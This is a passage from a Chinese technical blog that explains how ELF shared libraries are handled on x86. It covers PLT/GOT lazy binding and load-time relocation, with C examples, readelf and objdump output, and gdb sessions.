00001ffc  <span class="number">00000506</span> R_386_GLOB_DAT    <span class="number">00000000</span>   _ITM_registerTMCloneTa

Relocation section '.rel.plt' at offset 0x3c8 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
<span class="number">0000200</span>c  <span class="number">00000207</span> R_386_JUMP_SLOT   <span class="number">00000000</span>   __cxa_finalize
<span class="number">00002010</span>  <span class="number">00000307</span> R_386_JUMP_SLOT   <span class="number">00000000</span>   __gmon_start__
<span class="number">00002014</span>  <span class="number">00000907</span> R_386_JUMP_SLOT   <span class="number">0000057</span>c   ml_util_func
</code></pre><p>最后一行很表示载入器应该把符号<code>ml_util_func</code>的地址放入<code>0x2014</code>中(这个函数的GOT条目)</p>
<p>以上是在elf文件中。虽然</p>
<p>我们在gdb中检查首次调用函数后GOT条目的更改：</p>
<pre><code> ~/Work/project/blackhat/eli  gdb -q ./driver
Reading symbols from /home/lyy/Work/project/blackhat/eli/driver..<span class="string">.done</span>.
(gdb) b ml_func
Breakpoint <span class="number">1</span> <span class="preprocessor">at</span> <span class="number">0x80484b0</span>
(gdb) run
Starting program: /home/lyy/Work/project/blackhat/eli/./driver 
<span class="label">warning:</span> the debug information found <span class="keyword">in</span> <span class="string">"/usr/lib64/debug/lib64/ld-2.17.so.debug"</span> does <span class="keyword">not</span> match <span class="string">"/lib/ld-linux.so.2"</span> (CRC mismatch).

addr myglob = <span class="number">0x804a024</span>

Breakpoint <span class="number">1</span>, ml_func (a=<span class="number">1</span>, b=<span class="number">1</span>) <span class="preprocessor">at</span> ml_main_pic.c:<span class="number">10</span>
<span class="number">10</span>          <span class="keyword">int</span> c = b + ml_util_func(a)<span class="comment">;</span>
(gdb) disas ml_func
Dump of assembler code for function ml_func:
   <span class="number">0xf7fd8587</span> &lt;+<span class="number">0</span>&gt;:     <span class="keyword">push</span>   <span class="literal">ebp</span>
   <span class="number">0xf7fd8588</span> &lt;+<span class="number">1</span>&gt;:     <span class="keyword">mov</span>    <span class="literal">ebp</span>,<span class="literal">esp</span>
   <span class="number">0xf7fd858a</span> &lt;+<span class="number">3</span>&gt;:     <span class="keyword">push</span>   <span class="literal">ebx</span>
   <span class="number">0xf7fd858b</span> &lt;+<span class="number">4</span>&gt;:     <span class="keyword">sub</span>    <span class="literal">esp</span>,<span class="number">0x24</span>
   <span class="number">0xf7fd858e</span> &lt;+<span class="number">7</span>&gt;:     <span class="keyword">call</span>   <span class="number">0xf7fd8450</span> &lt;__x86.get_pc_thunk.bx&gt;
   <span class="number">0xf7fd8593</span> &lt;+<span class="number">12</span>&gt;:    <span class="keyword">add</span>    <span class="literal">ebx</span>,<span class="number">0x1a6d</span>
=&gt; <span class="number">0xf7fd8599</span> &lt;+<span class="number">18</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0x8</span>]
   <span class="number">0xf7fd859c</span> &lt;+<span class="number">21</span>&gt;:    <span class="keyword">mov</span>    <span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">esp</span>],<span class="literal">eax</span>
   <span class="number">0xf7fd859f</span> &lt;+<span class="number">24</span>&gt;:    <span class="keyword">call</span>   <span class="number">0xf7fd8440</span> &lt;ml_util_func@plt&gt;
   <span class="number">0xf7fd85a4</span> &lt;+<span class="number">29</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0xc</span>]
   <span class="number">0xf7fd85a7</span> &lt;+<span class="number">32</span>&gt;:    <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
   <span class="number">0xf7fd85a9</span> &lt;+<span class="number">34</span>&gt;:    <span class="keyword">mov</span>    <span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>-<span class="number">0xc</span>],<span class="literal">eax</span>
   <span class="number">0xf7fd85ac</span> &lt;+<span class="number">37</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebx</span>-<span class="number">0x14</span>]
   <span class="number">0xf7fd85b2</span> &lt;+<span class="number">43</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">eax</span>]
   <span class="number">0xf7fd85b4</span> &lt;+<span class="number">45</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>-<span class="number">0xc</span>]
   <span class="number">0xf7fd85b7</span> &lt;+<span class="number">48</span>&gt;:    <span class="keyword">add</span>    <span class="literal">edx</span>,<span class="literal">eax</span>
   <span class="number">0xf7fd85b9</span> &lt;+<span class="number">50</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebx</span>-<span class="number">0x14</span>]
   <span class="number">0xf7fd85bf</span> &lt;+<span class="number">56</span>&gt;:    <span class="keyword">mov</span>    <span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">eax</span>],<span class="literal">edx</span>
   <span class="number">0xf7fd85c1</span> &lt;+<span class="number">58</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebx</span>-<span class="number">0x14</span>]
   <span class="number">0xf7fd85c7</span> &lt;+<span class="number">64</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">eax</span>]
   <span class="number">0xf7fd85c9</span> &lt;+<span class="number">66</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0xc</span>]
   <span class="number">0xf7fd85cc</span> &lt;+<span class="number">69</span>&gt;:    <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
   <span class="number">0xf7fd85ce</span> &lt;+<span class="number">71</span>&gt;:    <span class="keyword">add</span>    <span class="literal">esp</span>,<span class="number">0x24</span>
---Type &lt;return&gt; to continue, <span class="keyword">or</span> q &lt;return&gt; to quit---q
Quit
(gdb) i registers <span class="literal">ebx</span>   #GOT基址
<span class="literal">ebx</span>            <span class="number">0xf7fda000</span>       -<span class="number">134373376</span>
(gdb) x/x <span class="number">0xf7fda000</span>+<span class="number">0x14</span>   # GOT中ml_util_func的地址
<span class="number">0xf7fda014</span>:     <span class="number">0xf7fd8446</span>  #和之前ELF文件中类似
(gdb) disas <span class="number">0xf7fd8440</span>  # ml_util_func@plt
Dump of assembler code for function ml_util_func@plt:
   <span class="number">0xf7fd8440</span> &lt;+<span class="number">0</span>&gt;:     <span class="keyword">jmp</span>    <span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebx</span>+<span class="number">0x14</span>]
   <span class="number">0xf7fd8446</span> &lt;+<span class="number">6</span>&gt;:     <span class="keyword">push</span>   <span class="number">0x10</span>
   <span class="number">0xf7fd844b</span> &lt;+<span class="number">11</span>&gt;:    <span class="keyword">jmp</span>    <span class="number">0xf7fd8410</span>
End of assembler dump.
</code></pre><p>调用一次：</p>
<pre><code>(gdb) n
<span class="number">11</span>          myglob += c;
(gdb) x/x <span class="number">0xf7fda000</span>+<span class="number">0x14</span>
<span class="number">0xf7fda014</span>:     <span class="number">0xf7fd857c</span>
(gdb) p &amp;ml_util_func
$<span class="number">1</span> = (<span class="keyword">int</span> (*)(<span class="keyword">int</span>)) <span class="number">0xf7fd857c</span> &lt;ml_util_func&gt;
</code></pre><p>可见GOT条目已经被更改。</p>
<h2 id="通过环境变量控制载入解析">通过环境变量控制载入解析</h2><p>通过<code>LD_BIND_NOW</code>和<code>LD_BIND_NOT</code>来定义加载方式。</p>
<pre><code><span class="keyword">man</span> ld.<span class="keyword">so</span>
</code></pre><h3 id="PIC的代价">PIC的代价</h3><ul>
<li>所有PIC中外部数据代码引用都需要额外的重定向，需要更多的内存。</li>
<li>在x86平台上多占用了一个通用寄存器，结果就需要更多内存引用。</li>
</ul>
<h3 id="结论">结论</h3><p>x64的好像作者没有写了。。。。。。。</p>
<p>x64平台上，因为能相对<code>rip</code>寻址，不需要通过某种方式获取程序指针。</p>
<p>关于<code>.got</code>和<code>.got.plt</code>提下，就是为了区分数据和函数引用，一个从GOT基址负引用<code>ebx-0x14</code>一个正引用<code>ebx+0x14</code>。这个设计= =</p>
<h2 id="Footnotes">Footnotes</h2>
            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/linux/2015/03/18/load-time-relocation-of-shared-libraries/" itemprop="url">
                  Load time relocation of shared libraries
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-18T00:00:00+08:00" content="2015-03-18">
              2015-03-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/linux/2015/03/18/load-time-relocation-of-shared-libraries/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2015/03/18/load-time-relocation-of-shared-libraries/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>想起昨天某厂电面被问到GOT怎么组织的= =，哈？我回头翻了翻Eli Bendersky的<a href="http://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries/" target="_blank" rel="external">Load-time relocation of shared libraries</a>和<a href="http://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/" target="_blank" rel="external">Position Independent Code (PIC) in shared libraries</a>。<a href="http://eli.thegreenplace.net" target="_blank" rel="external">Eli Bendersky</a>的网站我非常喜欢，他总能把复杂的问题以一种探索性的方式直观的阐释。我记得当我非常好奇gdb的原理时曾经看到过他的<a href="http://eli.thegreenplace.net/2011/01/23/how-debuggers-work-part-1/" target="_blank" rel="external">How debuggers work: Part 1 - Basics </a>和<a href="http://eli.thegreenplace.net/2011/01/27/how-debuggers-work-part-2-breakpoints/" target="_blank" rel="external">How debuggers work: Part 2 - Breakpoints</a>，都是难得一见的精品，值得一看</p>
<p>不吐槽面试了，作为面试简直是个惨不忍睹的失败展示，大概让面试官觉得我很low没发展前途，哈哈哈。不过被虐了感觉真好，要有空去面面各种开发测试产品设计。。。。。。一个人怎么能有这么多兴趣！</p>
<p>正文，省得过一段又忘的干干净净，意译<a href="http://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries/" target="_blank" rel="external">Load-time relocation of shared libraries </a>x64对这个都没支持了= =</p>
<p>程序有时候，几乎总是要导入来自外部的目标代码。有两种载入的方式：</p>
<ul>
<li>载入时重定位</li>
<li>PIC(位置无关代码)</li>
</ul>
<p>讲讲第一种。</p>
<p>可执行文件，动态链接库，blablablabla的什么能直接被机器执行的文件，都是机器码(废话…)要让文件可以执行和装载，必须符合ELF文件规范。操作系统根据ELF文件中提供的信息，按照规范把对应的代码段映射到内存空间的对应位置上去。内存空间大概看上去像这样：</p>
<p><img src="http://static.duartes.org/img/blogPosts/linuxFlexibleAddressSpaceLayout.png" alt="x86内存空间地址分布"></p>
<p>可以看到，文件映射，动态库啥的都是放到差不多中间的位置。</p>
<p>举个例子，我们关心几个问题，<code>ml_func</code>内如何解析(reference)<code>myglob</code>呢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    myglob += a;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译为非PIC，x86 动态共享库</p>
<pre><code> ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -shared -o libmlreloc.so ml_mainreloc.o
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">ml_mainreloc</span>.<span class="title">o</span>: <span class="title">warning</span>: <span class="title">relocation</span> <span class="title">against</span> `<span class="title">myglob</span>' <span class="title">in</span> <span class="title">readonly</span> <span class="title">section</span> `.<span class="title">text</span>'.</span>
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">warning</span>: <span class="title">creating</span> <span class="title">a</span> <span class="title">DT_TEXTREL</span> <span class="title">in</span> <span class="title">object</span>.</span>
</code></pre><p>把<code>myglob</code>重定位到了只读的<code>.text</code>。。。不过对研究没啥影响。</p>
<p>首先看看库的入口地址，链接器会从入口地址(‘.text’的开始位置)开始把代码载入调用者的进程空间。</p>
<pre><code> <span class="regexp">~/Work/</span>project<span class="regexp">/blackhat/</span>eli  readelf -h libmlreloc.so
ELF <span class="string">Header:</span>
    ...
  Entry point <span class="string">address:</span>               <span class="number">0x420</span>
    ...
</code></pre><p>反汇编共享库</p>
<pre><code>~/Work/project/blackhat/eli  objdump -d -Mintel libmlreloc.so

libmlreloc.so:     file format elf32-i386
...
<span class="number">0000054</span>c &lt;ml_func&gt;:
 <span class="number">54</span>c:   <span class="number">55</span>                      push   ebp
 <span class="number">54</span>d:   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">54f</span>:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    edx,DWORD PTR ds:<span class="number">0x0</span>
 <span class="number">555</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
 <span class="number">558</span>:   <span class="number">01</span> d0                   add    eax,edx
 <span class="number">55</span>a:   a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    ds:<span class="number">0x0</span>,eax
 <span class="number">55f</span>:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    edx,DWORD PTR ds:<span class="number">0x0</span>
 <span class="number">565</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">0</span>c                mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]
 <span class="number">568</span>:   <span class="number">01</span> d0                   add    eax,edx
 <span class="number">56</span>a:   <span class="number">5</span>d                      pop    ebp
 <span class="number">56</span>b:   c3                      ret    
 ...
</code></pre><p><code>myglob</code>即<code>ds:0x0</code>丫的是什么！这个地址，在载入其它程序进程空间后会被替代。</p>
<p>如何呢？</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlreloc.so

Relocation section '.rel.dyn' at offset 0x358 contains 11 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ee8  <span class="number">00000008</span> R_386_RELATIVE   
00001eec  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00002014</span>  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00000551</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">0000055</span>b  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">00000561</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
</code></pre><p>看看动态库文件中怎么记录该怎么替换哪里要替换的信息吧</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlreloc.so

Relocation section '.rel.dyn' at offset 0x358 contains 11 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ee8  <span class="number">00000008</span> R_386_RELATIVE   
00001eec  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00002014</span>  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00000551</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">0000055</span>b  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">00000561</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
</code></pre><p>有这么好几处要替换的，看下位置和objdump的位置一样。</p>
<p>根据ELF文件规则。这些地址这样替换:</p>
<pre><code>Offset位置的地址=Sym.<span class="function"><span class="title">Value</span><span class="params">(用nm可以看到将来映射后相对于虚拟载入基址的偏移)</span></span> + 库文件载入基址
</code></pre><p>下面看看看。作为初始化了的数据，<code>myglob</code>是放在<code>.data</code>中的。我们看看<code>.data</code>在哪。</p>
<pre><code> ~/Work/project/blackhat/eli  readelf --segments libmlreloc<span class="class">.so</span>

Elf file type is DYN (Shared <span class="tag">object</span> file)
Entry point <span class="number">0</span>x420
There are <span class="number">7</span> program headers, starting at offset <span class="number">52</span>

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           <span class="number">0</span>x000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000000 <span class="number">0</span>x005fc <span class="number">0</span>x005fc R E <span class="number">0</span>x1000
  LOAD           <span class="number">0</span>x000ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00134 <span class="number">0</span>x00138 RW  <span class="number">0</span>x1000
  DYNAMIC        <span class="number">0</span>x000ef4 <span class="number">0</span>x00001ef4 <span class="number">0</span>x00001ef4 <span class="number">0</span>x000f8 <span class="number">0</span>x000f8 RW  <span class="number">0</span>x4
  GNU_EH_FRAME   <span class="number">0</span>x000580 <span class="number">0</span>x00000580 <span class="number">0</span>x00000580 <span class="number">0</span>x0001c <span class="number">0</span>x0001c R   <span class="number">0</span>x4
  GNU_STACK      <span class="number">0</span>x000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000 <span class="number">0</span>x00000 RW  <span class="number">0</span>x4
  GNU_RELRO      <span class="number">0</span>x000ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00118 <span class="number">0</span>x00118 R   <span class="number">0</span>x1
  PAX_FLAGS      <span class="number">0</span>x000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000 <span class="number">0</span>x00000     <span class="number">0</span>x4

 Section to Segment mapping:
  Segment Sections...
   <span class="number">00</span>     <span class="class">.hash</span> <span class="class">.gnu</span><span class="class">.hash</span> <span class="class">.dynsym</span> <span class="class">.dynstr</span> <span class="class">.gnu</span><span class="class">.version</span> <span class="class">.gnu</span><span class="class">.version_r</span> <span class="class">.rel</span><span class="class">.dyn</span> <span class="class">.rel</span><span class="class">.plt</span> <span class="class">.init</span> <span class="class">.plt</span> <span class="class">.text</span> <span class="class">.fini</span> <span class="class">.eh_frame_hdr</span> <span class="class">.eh_frame</span> 
   <span class="number">01</span>     <span class="class">.init_array</span> <span class="class">.fini_array</span> <span class="class">.jcr</span> <span class="class">.dynamic</span> <span class="class">.got</span> <span class="class">.got</span><span class="class">.plt</span> <span class="class">.data</span> <span class="class">.bss</span> 
   <span class="number">02</span>     <span class="class">.dynamic</span> 
   <span class="number">03</span>     <span class="class">.eh_frame_hdr</span> 
   <span class="number">04</span>     
   <span class="number">05</span>     <span class="class">.init_array</span> <span class="class">.fini_array</span> <span class="class">.jcr</span> <span class="class">.dynamic</span> <span class="class">.got</span> 
   <span class="number">06</span>     
</code></pre><p><code>.data</code>是第二个段，载入后的虚拟地址是<code>0x1ee8</code>，大小是<code>0x00134</code></p>
<pre><code>In [<span class="number">18</span>]: <span class="function"><span class="title">hex</span><span class="params">(<span class="number">0</span>x1ee8+<span class="number">0</span>x134)</span></span>
Out[<span class="number">18</span>]: <span class="string">'0x201c'</span>
</code></pre><p>第二个段扩展到<code>0x201c</code>包含<code>myglob</code>(<code>0x2018</code>)</p>
<p>linux下有个方便的<code>dl_iterate_phdr</code>函数来查看运行时载入的动态链接库。gdb的<code>i shared</code>也可以看到载入库的地址，不过只能看到入口地址而不能看到每个段。</p>
<p>用这么个例子来看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;link.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">header_handler</span><span class="params">(<span class="keyword">struct</span> dl_phdr_info* info, size_t size, <span class="keyword">void</span>* data)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"name=%s (%d segments) address=%p\n"</span>,</span><br><span class="line">            info-&gt;dlpi_name, info-&gt;dlpi_phnum, (<span class="keyword">void</span>*)info-&gt;dlpi_addr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; info-&gt;dlpi_phnum; j++) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\t\t header %2d: address=%10p\n"</span>, j,</span><br><span class="line">             (<span class="keyword">void</span>*) (info-&gt;dlpi_addr + info-&gt;dlpi_phdr[j].p_vaddr));</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\t\t\t type=%u, flags=0x%X\n"</span>,</span><br><span class="line">                 info-&gt;dlpi_phdr[j].p_type, info-&gt;dlpi_phdr[j].p_flags);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    dl_iterate_phdr(header_handler, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> t = ml_func(argc, argc);</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那啥回调啥原理不说了，我也不懂，反正用来看载入地址就好。</p>
<pre><code>✘  ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/blackhat/</span>eli  gcc -std=c99 -m32 -g -c driver.c -o driver.o
~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/blackhat/</span>eli  gcc -m32 -o driver driver.o -L. -lmlreloc 
</code></pre><p>直接gdb会话：</p>
<pre><code> ~/Work/project/blackhat/eli  gdb -q driver
Reading symbols from /home/reverland/Work/project/blackhat/eli/driver...done.
(gdb) b driver.c:<span class="number">31</span>
Breakpoint <span class="number">1</span> at <span class="number">0x804874b</span>: file driver.c, line <span class="number">31.</span>
(gdb) r
Starting program: /home/reverland/Work/project/blackhat/eli/driver 
warning: the debug information found in <span class="string">"/usr/lib64/debug/lib64/ld-2.17.so.debug"</span> does not match <span class="string">"/lib/ld-linux.so.2"</span> (CRC mismatch).
...
name=/home/reverland/Work/project/blackhat/eli/libmlreloc.so (<span class="number">7</span> segments) address=<span class="number">0xf7fd8000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7fd9ef4</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7fd8580</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>
...
(gdb) p &amp;myglob
$<span class="number">1</span> = (<span class="keyword">int</span> *) <span class="number">0xf7fda018</span> &lt;myglob&gt;
(gdb) 
</code></pre><p>忽视调试信息的警告，那个我记得好像是gentoo的某个bug。我们看到，<code>libmlreloc.so</code>被载入到了<code>0xf7fd8000</code>，别太在意这个地址，按理说ALSR啥的这个地址变化挺正常，虽然我记得gdb中默认禁用alsr了。。。</p>
<p>第二个段在<code>0xf7fd9ee8</code>。这正好就是载入基址(<code>0xf7fd8000</code>)+VirtAddr(就是映射到目标进程空间后的偏移<code>0x00001ee8</code>)</p>
<p>另一方面，我们看到<code>myglob</code>在<code>0xf7fda018</code>。这个地址正好是载入基址(<code>0xf7fd8000</code>)+myglob的偏移(<code>0x00002018</code>)</p>
<p>我们最后在gdb中看下现在的(载入动态库后)的反汇编结果：</p>
<pre><code>(gdb) disas /r ml_func
Dump of assembler code for function ml_func:
   <span class="number">0xf7fd854c</span> &lt;+<span class="number">0</span>&gt;:     <span class="number">55</span>      <span class="keyword">push</span>   <span class="literal">ebp</span>
   <span class="number">0xf7fd854d</span> &lt;+<span class="number">1</span>&gt;:     <span class="number">89</span> e5   <span class="keyword">mov</span>    <span class="literal">ebp</span>,<span class="literal">esp</span>
   <span class="number">0xf7fd854f</span> &lt;+<span class="number">3</span>&gt;:     8b <span class="number">15</span> <span class="number">18</span> a0 fd f7       <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> <span class="literal">ds</span>:<span class="number">0xf7fda018</span>
   <span class="number">0xf7fd8555</span> &lt;+<span class="number">9</span>&gt;:     8b <span class="number">45</span> <span class="number">08</span>        <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0x8</span>]
   <span class="number">0xf7fd8558</span> &lt;+<span class="number">12</span>&gt;:    <span class="number">01</span> d0   <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
   <span class="number">0xf7fd855a</span> &lt;+<span class="number">14</span>&gt;:    a3 <span class="number">18</span> a0 fd f7  <span class="keyword">mov</span>    <span class="literal">ds</span>:<span class="number">0xf7fda018</span>,<span class="literal">eax</span>
   <span class="number">0xf7fd855f</span> &lt;+<span class="number">19</span>&gt;:    8b <span class="number">15</span> <span class="number">18</span> a0 fd f7       <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> <span class="literal">ds</span>:<span class="number">0xf7fda018</span>
